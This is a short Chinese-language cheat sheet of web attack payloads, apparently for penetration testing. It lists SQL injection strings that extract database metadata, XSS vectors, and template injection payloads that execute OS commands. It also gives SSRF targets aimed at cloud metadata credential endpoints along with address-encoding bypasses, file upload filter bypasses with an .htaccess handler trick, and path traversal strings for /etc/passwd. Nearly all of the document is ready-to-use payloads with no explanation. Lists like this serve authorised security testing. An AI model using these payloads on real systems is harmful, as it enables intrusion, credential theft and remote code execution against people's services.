# 常用 payload 速查

## SQLi
```
' OR '1'='1
' AND SLEEP(5)--
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
1' UNION SELECT NULL,NULL,group_concat(table_name) FROM information_schema.tables--
%df' OR 1=1#
```

## XSS
```
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
"><script>alert(1)</script>
'-alert(1)-'
<details open ontoggle=alert(1)>
javascript:alert(1)
```

## SSTI
```
{{7*7}}
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{lipsum.__globals__['os'].popen('id').read()}}
${T(java.lang.Runtime).getRuntime().exec('id')}
```

## SSRF 内网目标
```
http://127.0.0.1:22 / :3306 / :6379 / :8080
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://100.100.100.200/latest/meta-data/          # 阿里云
http://metadata.tencentyun.com/latest/meta-data/  # 腾讯云
http://2130706433/      # 127.0.0.1 十进制
http://0x7f000001/      # 十六进制
http://[::ffff:127.0.0.1]/
file:///etc/passwd
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a
```

## 文件上传测试文件名
```
shell.php / shell.phtml / shell.php5 / shell.pht
shell.php.jpg / shell.php. . / shell.PhP
.htaccess  (内容: AddType application/x-httpd-php .jpg)
```

## 路径穿越
```
../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
....//....//etc/passwd
..;/..;/etc/passwd
```
